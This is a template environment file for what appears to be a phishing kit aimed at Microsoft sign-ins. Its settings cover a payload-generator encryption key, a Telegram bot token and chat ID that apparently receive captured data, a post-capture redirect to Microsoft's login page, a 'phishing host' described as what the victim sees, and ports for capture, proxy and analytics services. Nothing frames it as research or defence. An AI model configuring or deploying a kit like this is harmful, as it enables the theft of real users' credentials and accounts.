# Copy this to .env and fill in your values.
# .env is gitignored — never commit secrets.

# AES-256 key (generate: cd payload-generator && go run keygen.go)
STORAGE_KEY=laZ6Z3XmXXAJb1JJeLJ1rQITgxQAtQxbWGYa1WQoln8=

# Telegram bot (create via @BotFather, get chat ID via @getidsbot)
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghikl-zyx57W2v1u123ew11
TELEGRAM_CHAT_ID=-1001234567890

# Post-capture redirect URL
REDIRECT_URL=https://login.microsoftonline.com

# Proxy server upstream hostname (what victim sees)
PHISHING_HOST=localhost:9090

# Ports (optional — defaults shown)
# PORT_CAPTURE=9090
# PORT_PROXY=9091
# PORT_ANALYTICS=9092
